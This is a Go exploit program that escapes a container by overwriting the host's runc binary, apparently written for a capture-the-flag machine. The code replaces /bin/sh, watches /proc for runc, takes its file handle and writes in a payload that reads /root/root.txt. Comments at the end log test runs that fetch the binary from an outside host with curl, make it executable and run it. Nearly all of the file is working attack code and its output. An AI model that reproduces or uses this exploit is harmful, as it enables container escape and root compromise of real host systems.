package main

import (
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

func main() {
	payload := "#!/bin/bash\ncat /root/root.txt > /tmp/iamf.txt"
	interpreter := "#!/proc/self/exe\n"

	// Overwrite/bin/sh with interpreter and set the file perm to 777
	shFile, err := os.OpenFile("/bin/sh", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		log.Fatal(err.Error())
	}
	_, err = shFile.WriteString(interpreter)
	if err != nil {
		log.Fatal(err.Error())
	}
	err = shFile.Chmod(0777)
	if err != nil {
		log.Fatalf(err.Error())
	}
	log.Println("[+] /bin/sh has been overwritten")

	log.Println("[*] Waiting for runc to be executed ...")
	runcPID := 0
	for {
		if runcPID != 0 {
			break
		}

		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			log.Fatal("Failed to open /proc", err.Error())
		}
		for _, pid := range pids {
			match, _ := filepath.Match("[0-9]*", pid.Name())
			if match {
				readCmdLine, _ := ioutil.ReadFile("/proc/" + pid.Name() + "/cmdline")
				if strings.Contains(string(readCmdLine), "runc") {
					log.Println("[+] runc PID found: ", pid.Name())
					runcPID, err = strconv.Atoi(pid.Name())
					if err != nil {
						log.Println("Cannot convert", pid.Name())
						return
					}
				}
			}
		}
	}

	log.Printf("[*]Wait for runc process (/proc/%d/exe) to exit and get a file handle", runcPID)
	runcFd := 0
	for {
		if runcFd != 0 {
			break
		}
		fdR, _ := os.OpenFile("/proc/"+strconv.Itoa(runcPID)+"/exe", os.O_RDONLY, 0777)
		if err != nil {
			log.Printf("Cannot open /proc/%d/exe %s", runcPID, err.Error())
			return
		}
		if int(fdR.Fd()) == 3 {
			log.Printf("[+] Obtained the file handle (%p)", fdR)
			runcFd = int(fdR.Fd())
		}
	}
	log.Printf("[*] Overwrite runc from /proc/self/fd/%d", runcFd)
	for {
		fdW, err := os.OpenFile("/proc/self/fd/"+strconv.Itoa(runcFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if err != nil {
			// log.Println(err, "but keep it open")
		}
		if int(fdW.Fd()) > 0 {
			fdW.WriteString(payload)
			log.Print("[+] Done, runc has been overwritten")
			os.Exit(0)
		}
	}
}

// Output testing

// root@5235a74a396e:/opt/webapp# curl -s 10.10.14.17/breakout > breakout && chmod +x breakout && ./breakout
// 2021/08/07 19:34:26 [+] /bin/sh has been overwritten
// 2021/08/07 19:34:26 [*] Waiting for runc to be executed ...
// 2021/08/07 19:34:26 [+] runc PID found:  4576
// 2021/08/07 19:34:26 [*] Opening /proc/4576/exe and hold runc
// 2021/08/07 19:34:26 [+] Obtained runc file descriptor: 0
// 2021/08/07 19:34:26 [*] Overwrite runc from /proc/self/fd/0
//         #!/bin/bash
//         cat /root/root.txt > /tmp/iamf.txt
//         root@5235a74a396e:/opt/webapp#
// root@5235a74a396e:/opt/webapp# curl -s 10.10.14.17/breakout > breakout && chmod +x breakout && ./breakout
// 2021/08/07 19:36:36 [+] /bin/sh has been overwritten
// 2021/08/07 19:36:36 [*] Waiting for runc to be executed ...
// 2021/08/07 19:36:42 [+] runc PID found:  4611
// 2021/08/07 19:36:42 [*] Opening /proc/4611/exe and hold runc
// 2021/08/07 19:36:42 [+] Obtained runc file descriptor: 3
// 2021/08/07 19:36:42 [*] Overwrite runc from /proc/self/fd/3
// Cannot open runc open /proc/self/fd/3: text file busy

// root@601fa18abced:/opt/webapp# curl -s 10.10.14.17/breakout > breakout && chmod +x breakout && ./breakout
// 2021/08/07 20:33:15 [+] /bin/sh has been overwritten
// 2021/08/07 20:33:15 [*] Waiting for runc to be executed ...
// 2021/08/07 20:33:16 [+] runc PID found:  32
// 2021/08/07 20:33:16 [*] Wait for runc process (/proc/32/exe) to exit and get a file handle
// 2021/08/07 20:33:17 [+] Obtained the file handle (0xc0000a8820)
// 2021/08/07 20:33:17 [*] Overwrite runc from /proc/self/fd/3
// 2021/08/07 20:33:17 [+] Done, runc has been overwritten
